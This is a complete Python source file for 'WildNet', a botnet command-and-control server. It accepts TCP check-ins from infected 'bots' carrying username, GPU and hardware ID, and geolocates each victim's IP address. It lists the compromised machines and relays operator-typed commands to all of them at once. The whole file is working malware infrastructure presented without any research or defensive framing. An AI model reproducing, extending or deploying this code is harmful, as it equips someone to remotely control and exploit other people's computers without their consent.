import os
import time
import socket
import requests
import threading
ActualVersion = 1.2
HOST = '0.0.0.0'
PORT = 1234
Clients, HWIDs = {}, []

def search(hwid):
    for i, d in enumerate(HWIDs):
        if d['HWID'] == hwid: return i

class Listener:
    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((HOST, PORT))
        self.server.listen(10)

        print(f"[+] WildNet tcp started on {HOST}:{PORT}")
        while True:
            (client, client_address) = self.server.accept()
            BotHandler(client, client_address).start()

class BotHandler(threading.Thread):
    def __init__(self, client, client_address):
        threading.Thread.__init__(self)

        self.client = client
        self.client_address = client_address

    def run(self):
        try:
            rawList = self.client.recv(1024).decode('utf-8').replace('\x00', '').split('@')
            if len(rawList) == 4:
                Username, GPU, HWID, Version = rawList
            else:
                Username, GPU, HWID = rawList
                Version = 1.1
        except: return

        try: CC = requests.get(f'http://ip-api.com/json/{self.client_address[0]}?fields=66842623&lang=en').json()['countryCode']
        except: CC = None

        value = {
                 'Username' : Username,
                 'GPU' : GPU,
                 'IP' : self.client_address[0],
                 'PORT' : self.client_address[1],
                 'CC' : CC,
                 'Client' : self.client,
                 'Status' : '+',
                 'HWID' : HWID,
                 'Version' : float(Version)
                }

        if HWID in Clients:
            if Clients[HWID]['Status'] == '+':
                if Clients[HWID]['Version'] == ActualVersion:
                    self.client.send('exit'.encode('utf-8'))
                    return
                else:
                    try: Clients[HWID]['Client'].send('exit'.encode('utf-8'))
                    except: pass

        if not search(HWID):
            HWIDs.append(value)
        Clients[HWID] = value
        return

def CMD():
    time.sleep(1)
    while True:
        #try:
        good = 0
        i = str(input('WildNet > '))
        if 'cls' == i: os.system('cls')
        elif i == 'list':
            try: sorted_keys = sorted(Clients, key=lambda x: (Clients[x]['CC']))
            except: pass
            sorted_keys = sorted(Clients, key=lambda x: (Clients[x]['Status']))
            for bot in sorted_keys: print(f"[{Clients[bot]['Status']}]{Clients[bot]['Version']}[{Clients[bot]['CC']}] {Clients[bot]['IP']} | {Clients[bot]['Username']} | {Clients[bot]['GPU']}")
        else:
            print(f'[>] Sending "{i}" to {len(HWIDs)} bots')
            for bot in HWIDs:
                try:
                    bot['Client'].send(i.encode('utf-8'))
                    good += 1
                except: continue
            print(f'[>] Done! Good: {good}')
        #except: pass

def online():
    while True:
        for i, bot in enumerate(HWIDs):
            try:
                bot['Client'].send('ping'.encode('utf-8'))
                bot['Client'].recv(1024).decode('utf-8')
            except:
                Clients[bot['HWID']]['Status'] = '-'
                HWIDs.pop(i)

def _logging():
    while True:
        os.system(f'title [WildNet] Online: {len(HWIDs)} :: Offline: {len(Clients) - len(HWIDs)} :: Total: {len(Clients)}')
        time.sleep(1)

def main():
    threading.Thread(target = online).start()
    threading.Thread(target = _logging).start()
    threading.Thread(target = CMD).start()
    try: Listener().start()
    except Exception as ex: print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__ == '__main__':
    main()
